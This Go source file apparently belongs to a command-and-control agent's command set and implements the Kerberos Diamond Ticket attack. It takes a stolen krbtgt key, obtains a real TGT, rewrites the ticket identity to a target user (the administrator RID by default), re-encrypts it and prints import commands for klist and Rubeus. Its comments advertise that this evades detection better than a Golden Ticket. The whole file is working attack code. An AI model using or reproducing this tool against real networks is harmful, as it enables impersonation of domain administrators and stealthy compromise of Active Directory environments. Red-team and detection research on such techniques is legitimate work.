// ticket_diamond.go implements the Diamond Ticket technique (T1558.001).
// A Diamond Ticket requests a legitimate TGT from the KDC, then decrypts it
// using the krbtgt key to modify the ticket identity. This creates a ticket
// backed by a real AS exchange in KDC logs, making it harder to detect than
// a purely forged Golden Ticket.

package commands

import (
	"encoding/base64"
	"encoding/hex"
	"fmt"
	"strings"
	"time"

	"fawkes/pkg/structs"

	"github.com/jcmturner/gofork/encoding/asn1"
	"github.com/jcmturner/gokrb5/v8/asn1tools"
	"github.com/jcmturner/gokrb5/v8/crypto"
	"github.com/jcmturner/gokrb5/v8/iana/asnAppTag"
	"github.com/jcmturner/gokrb5/v8/iana/keyusage"
	"github.com/jcmturner/gokrb5/v8/iana/nametype"
	"github.com/jcmturner/gokrb5/v8/messages"
	"github.com/jcmturner/gokrb5/v8/types"
)

// ticketDiamond performs the Diamond Ticket technique:
// 1. Authenticates as a valid user to the KDC (real AS exchange)
// 2. Decrypts the TGT using the stolen krbtgt key
// 3. Modifies the identity (CName) in the EncTicketPart
// 4. Re-encrypts with the krbtgt key
// 5. Exports as kirbi/ccache
//
// The resulting ticket has real KDC timestamps and a corresponding AS exchange
// in the KDC logs, making it significantly harder to detect than a Golden Ticket
// forged entirely offline.
func ticketDiamond(args ticketArgs) structs.CommandResult {
	defer structs.ZeroString(&args.Key)
	defer structs.ZeroString(&args.KrbtgtKey)

	// Validate required args
	if args.Realm == "" || args.Username == "" || args.Key == "" || args.KrbtgtKey == "" || args.Server == "" {
		return errorResult("Error: realm, username, key (user key), krbtgt_key, and server (KDC) are required for diamond")
	}

	realm := strings.ToUpper(args.Realm)
	if args.Format == "" {
		args.Format = "kirbi"
	}
	if args.KeyType == "" {
		args.KeyType = "aes256"
	}
	if args.KrbtgtKeyType == "" {
		args.KrbtgtKeyType = "aes256"
	}
	targetUser := args.TargetUser
	if targetUser == "" {
		targetUser = args.Username
	}
	targetRID := args.TargetRID
	if targetRID <= 0 {
		targetRID = 500
	}

	// Parse user key (for AS exchange authentication)
	userKeyBytes, err := hex.DecodeString(args.Key)
	if err != nil {
		return errorf("Error decoding user key hex: %v", err)
	}
	defer structs.ZeroBytes(userKeyBytes)

	etypeID, etypeCfgName, errResult := ticketParseKeyType(args.KeyType, userKeyBytes)
	if errResult != nil {
		return *errResult
	}

	userKey := types.EncryptionKey{
		KeyType:  etypeID,
		KeyValue: userKeyBytes,
	}

	// Parse krbtgt key (for ticket decryption/re-encryption)
	krbtgtKeyBytes, err := hex.DecodeString(args.KrbtgtKey)
	if err != nil {
		return errorf("Error decoding krbtgt key hex: %v", err)
	}
	defer structs.ZeroBytes(krbtgtKeyBytes)

	krbtgtEtypeID, _, errResult := ticketParseKeyType(args.KrbtgtKeyType, krbtgtKeyBytes)
	if errResult != nil {
		return *errResult
	}

	krbtgtKey := types.EncryptionKey{
		KeyType:  krbtgtEtypeID,
		KeyValue: krbtgtKeyBytes,
	}

	// Resolve KDC address
	kdcAddr := args.Server
	if !strings.Contains(kdcAddr, ":") {
		kdcAddr += ":88"
	}

	// Step 1: Get legitimate TGT via AS exchange (creates real KDC log entry)
	tgt, sessionKey, err := ticketOPtH(args.Username, realm, etypeID, etypeCfgName, userKey, kdcAddr)
	if err != nil {
		return errorf("Error obtaining TGT for %s: %v", args.Username, err)
	}

	// Step 2: Decrypt the ticket's EncPart using krbtgt key
	plainBytes, err := crypto.DecryptEncPart(tgt.EncPart, krbtgtKey, keyusage.KDC_REP_TICKET)
	if err != nil {
		return errorf("Error decrypting ticket with krbtgt key (wrong key?): %v", err)
	}

	// Step 3: Parse EncTicketPart
	var etp messages.EncTicketPart
	if err := etp.Unmarshal(plainBytes); err != nil {
		return errorf("Error parsing EncTicketPart: %v", err)
	}

	// Step 4: Modify the EncTicketPart
	// Change CName to target user identity
	etp.CName = types.PrincipalName{
		NameType:   nametype.KRB_NT_PRINCIPAL,
		NameString: []string{targetUser},
	}
	// Strip AuthorizationData (PAC) — cannot re-sign without NDR marshal.
	// The ticket works against services without PAC validation.
	// Full PAC modification requires NDR encoding (future enhancement).
	etp.AuthorizationData = types.AuthorizationData{}

	// Step 5: Re-marshal and re-encrypt with krbtgt key
	etpBytes, err := asn1.Marshal(etp)
	if err != nil {
		return errorf("Error marshaling modified EncTicketPart: %v", err)
	}
	etpBytes = asn1tools.AddASNAppTag(etpBytes, asnAppTag.EncTicketPart)

	kvno := tgt.EncPart.KVNO
	if args.KVNO > 0 {
		kvno = args.KVNO
	}

	encData, err := crypto.GetEncryptedData(etpBytes, krbtgtKey, keyusage.KDC_REP_TICKET, kvno)
	if err != nil {
		return errorf("Error re-encrypting ticket: %v", err)
	}

	// Build modified ticket preserving outer structure
	modifiedTicket := messages.Ticket{
		TktVNO:  tgt.TktVNO,
		Realm:   tgt.Realm,
		SName:   tgt.SName,
		EncPart: encData,
	}

	// Step 6: Export as kirbi or ccache
	sname := tgt.SName
	authTime := etp.AuthTime
	endTime := etp.EndTime
	renewTill := etp.RenewTill
	ticketFlags := etp.Flags

	var output string
	switch strings.ToLower(args.Format) {
	case "kirbi":
		kirbiBytes, err := ticketToKirbi(modifiedTicket, sessionKey, targetUser, realm, sname, ticketFlags, authTime, endTime, renewTill)
		if err != nil {
			return errorf("Error creating kirbi: %v", err)
		}
		output = ticketDiamondFormatOutput(args, realm, targetUser, targetRID, sessionKey, authTime, endTime, base64.StdEncoding.EncodeToString(kirbiBytes))
	case "ccache":
		ticketBytes, err := modifiedTicket.Marshal()
		if err != nil {
			return errorf("Error marshaling ticket: %v", err)
		}
		ccacheBytes := ticketToCCache(ticketBytes, sessionKey, targetUser, realm, sname, ticketFlags, authTime, endTime, renewTill)
		output = ticketDiamondFormatOutput(args, realm, targetUser, targetRID, sessionKey, authTime, endTime, base64.StdEncoding.EncodeToString(ccacheBytes))
	default:
		return errorf("Error: unknown format %q. Use: kirbi, ccache", args.Format)
	}

	return successResult(output)
}

func ticketDiamondFormatOutput(args ticketArgs, realm, targetUser string, targetRID int, sessionKey types.EncryptionKey, start, end time.Time, b64 string) string {
	var sb strings.Builder
	sb.WriteString("[*] Diamond Ticket forged successfully\n")
	sb.WriteString(fmt.Sprintf("    Auth User:     %s@%s (legitimate AS exchange)\n", args.Username, realm))
	sb.WriteString(fmt.Sprintf("    Target User:   %s@%s (RID: %d)\n", targetUser, realm, targetRID))
	sb.WriteString(fmt.Sprintf("    KDC:           %s\n", args.Server))
	sb.WriteString(fmt.Sprintf("    User Key:      %s (etype %d)\n", args.KeyType, sessionKey.KeyType))
	sb.WriteString(fmt.Sprintf("    Krbtgt Key:    %s\n", args.KrbtgtKeyType))
	sb.WriteString(fmt.Sprintf("    Valid:         %s — %s\n", start.Format("2006-01-02 15:04:05 UTC"), end.Format("2006-01-02 15:04:05 UTC")))
	sb.WriteString(fmt.Sprintf("    Format:        %s\n", args.Format))
	sb.WriteString("[*] Advantage: Real AS exchange in KDC logs — harder to detect than Golden Ticket\n")
	sb.WriteString("[*] Note: PAC stripped. Services with strict PAC validation may reject.\n")
	sb.WriteString(fmt.Sprintf("\n[+] Base64 %s ticket:\n%s\n", args.Format, b64))

	if args.Format == "kirbi" {
		sb.WriteString("\n[*] Import: klist -action import -ticket <base64>\n")
		sb.WriteString("[*] Or:     Rubeus.exe ptt /ticket:<base64>\n")
	} else {
		sb.WriteString("\n[*] Import: klist -action import -ticket <base64>\n")
		sb.WriteString("[*] Or:     echo '<base64>' | base64 -d > /tmp/krb5cc && export KRB5CCNAME=/tmp/krb5cc\n")
	}

	return sb.String()
}
